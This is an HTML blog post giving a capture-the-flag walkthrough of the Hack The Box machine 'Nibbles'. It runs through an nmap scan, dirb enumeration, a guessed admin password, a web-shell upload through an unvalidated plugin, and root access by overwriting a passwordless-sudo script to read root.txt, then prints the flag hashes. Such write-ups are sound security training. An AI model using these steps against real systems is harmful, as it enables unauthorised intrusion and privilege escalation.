<p><img src="../../assets/images/htb/nibbles.png" alt="banner" /></p>
<h1 id="nibbles-10101075">Nibbles: 10.10.10.75</h1>

<h2 id="scanning">Scanning:</h2>

<p><br /></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap 10.10.10.75

Starting Nmap 7.01 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2018-05-05 19:14 EDT
Nmap scan report <span class="k">for </span>10.10.10.75
Host is up <span class="o">(</span>0.11s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>21.39 seconds
</code></pre></div></div>

<p><br /></p>

<h2 id="gaining-access">Gaining Access:</h2>

<p><br /></p>

<p>As always, let’s start exploring the HTTP application running on port 80.</p>

<p><img src="/assets/images/75_index.html.png" alt="" /></p>

<p><img src="/assets/images/75_index.source.png" alt="" /></p>

<p>Well, nothing interesting there.. Let’s use <a href="https://tools.kali.org/web-applications/dirb">dirb</a> to bruteforce all common known directories as so <code class="highlighter-rouge">dirb 10.10.10.75/nibbleblog/</code></p>

<p><strong>Note: I created a function for calling dirb:</strong></p>

<p><em>~/.zshrc</em></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dirb<span class="o">(){</span>
    <span class="nb">echo</span> <span class="s1">'HTTPS'</span>
    <span class="nb">echo</span>
    /home/srbz/._bin/dirb/dirb https://<span class="nv">$1</span> /home/srbz/._bin/dirb/wordlists/common.txt
    <span class="nb">echo</span> <span class="s1">'HTTP'</span>
    <span class="nb">echo</span>
    /home/srbz/._bin/dirb/dirb http://<span class="nv">$1</span> /home/srbz/._bin/dirb/wordlists/common.txt
<span class="o">}</span>
</code></pre></div></div>

<p>Apparently, there’s no other way to login than guessing. Hack the box usually use the challenge name as the password.</p>

<p><code class="highlighter-rouge">username: admin</code></p>

<p><code class="highlighter-rouge">password: nibbles</code></p>

<p><img src="/assets/images/75_blog.png" alt="" /></p>

<p><br /></p>

<h2 id="maintaining-access">Maintaining Access:</h2>

<p><br /></p>

<p>Once logged in, we can upload files by using the plugin<code class="highlighter-rouge">my_image.</code> The vulnerability of that plugin is that it does not verrify the file extension. So, I uploaded my <a href="https://github.com/KevinCarroll7737/tools/blob/master/shell.php">shell.php</a></p>

<p><img src="/docs/assets/images/75_upload.png" alt="" /></p>

<p>By running <a href="https://github.com/KevinCarroll7737/tools/blob/master/linenum.sh">linEnum.sh</a>, I’ve been able to see fast and clearly which files the user <code class="highlighter-rouge">nibbler</code> had the control of.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash linenum.sh

<span class="o">(</span>...<span class="o">)</span>

utching Defaults entries <span class="k">for </span>nibbler on Nibbles:
    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin

User nibbler may run the following commands on Nibbles:
    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
</code></pre></div></div>

<p>Ok so we can use <code class="highlighter-rouge">/home/nibbler/personal/stuff/monitor.sh</code> with sudo without giving password. Let’s change what’s in this script.</p>

<p><br /></p>

<h2 id="covering-tasks">Covering Tasks:</h2>

<p><br /></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s1">'cat /root/root.txt &gt; /tmp/srbz.txt; chown nibbler:nibbler /tmp/srbz.txt; chmod 777 /tmp/srbz.txt'</span> <span class="o">&gt;</span>  /home/nibbler/personal/stuff/monitor.sh
<span class="nb">sudo</span> /home/nibbler/personal/stuff/monitor.sh
<span class="nb">cat</span> /tmp/srbz.txt
b6d745c0dfb6457c55591efc898ef88c
<span class="nb">cat</span> /home/nibbler/user.txt
b02ff32bb332deba49eeaed21152c8d8
</code></pre></div></div>
